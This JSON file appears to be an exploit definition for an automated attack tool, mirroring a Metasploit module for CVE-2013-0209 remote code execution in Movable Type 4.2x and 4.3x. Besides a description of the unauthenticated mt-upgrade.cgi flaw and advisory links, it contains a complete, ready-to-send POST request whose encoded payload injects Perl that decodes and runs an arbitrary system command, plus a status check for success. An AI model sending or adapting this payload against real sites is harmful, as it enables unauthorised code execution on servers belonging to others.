{
   "variables" : {
      "PATH" : {
         "VALUE" : "/mt",
         "DESCRIPTION" : "The URI path of the Movable Type installation"
      }
   },
   "title" : "Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution",
   "platform" : "MULTI",
   "type" : "MSF",
   "description" : "\n\n          This module can be used to execute a payload on MoveableType (MT) that\n\n          exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),\n\n          that is used during installation and updating of the platform.\n\n          The vulnerability arises due to the following properties:\n\n          1. This script may be invoked remotely without requiring authentication\n\n          to any MT instance.\n\n          2. Through a crafted POST request, it is possible to invoke particular\n\n          database migration functions (i.e. functions that bring the existing\n\n          database up-to-date with an updated codebase) by name and with\n\n          particular parameters.\n\n          3. A particular migration function, core_drop_meta_for_table, allows\n\n          a class parameter to be set which is used directly in a perl eval\n\n          statement, allowing perl code injection.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "requests" : {
      "EXPLOIT2" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /mt-upgrade.cgi",
         "PAYLOAD" : "__mode=run_actions&installing=1&steps=%5b%5b%22core_drop_meta_for_table%22%2c%22class%22%2c%22v0%3buse%20MIME%3a%3aBase64%3bsystem%28decode_base64%28q%28X19QQVlMT0FEX18%3d%29%29%29%3breturn%200%22%5d%5d",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "METHOD" : "POST",
         "PATH" : "mt-upgrade.cgi"
      }
   },
   "informations" : {
      "MSF_MODULE" : "movabletype_upgrade_exec",
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/mt",
            "DESCRIPTION" : "The URI path of the Movable Type installation"
         }
      },
      "DESCRIPTION" : "\n\n          This module can be used to execute a payload on MoveableType (MT) that\n\n          exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),\n\n          that is used during installation and updating of the platform.\n\n          The vulnerability arises due to the following properties:\n\n          1. This script may be invoked remotely without requiring authentication\n\n          to any MT instance.\n\n          2. Through a crafted POST request, it is possible to invoke particular\n\n          database migration functions (i.e. functions that bring the existing\n\n          database up-to-date with an updated codebase) by name and with\n\n          particular parameters.\n\n          3. A particular migration function, core_drop_meta_for_table, allows\n\n          a class parameter to be set which is used directly in a perl eval\n\n          statement, allowing perl code injection.\n\n      ",
      "name" : "MovabletypeUpgradeExec",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /mt-upgrade.cgi",
            "PAYLOAD" : "__mode=run_actions&installing=1&steps=%5b%5b%22core_drop_meta_for_table%22%2c%22class%22%2c%22v0%3buse%20MIME%3a%3aBase64%3bsystem%28decode_base64%28q%28X19QQVlMT0FEX18%3d%29%29%29%3breturn%200%22%5d%5d",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "METHOD" : "POST",
            "PATH" : "mt-upgrade.cgi"
         }
      },
      "OSVDB" : 89322,
      "CVE" : "CVE-2013-0209",
      "TITLE" : "Movable Type 4.2x, 4.3x Web Upgrade Remote Code Execution",
      "TYPE" : "MSF",
      "PLATFORM" : "MULTI",
      "PATHS" : [
         "mt"
      ],
      "REFERENCES" : [
         "http://www.sec-1.com/blog/?p=402",
         "http://www.movabletype.org/2013/01/movable_type_438_patch.html"
      ]
   },
   "detection" : {},
   "osvdb" : 89322,
   "paths" : [
      "mt"
   ],
   "cve" : "CVE-2013-0209",
   "name" : "MovabletypeUpgradeExec",
   "msf_module" : "movabletype_upgrade_exec",
   "references" : [
      "http://www.sec-1.com/blog/?p=402",
      "http://www.movabletype.org/2013/01/movable_type_438_patch.html"
   ]
}
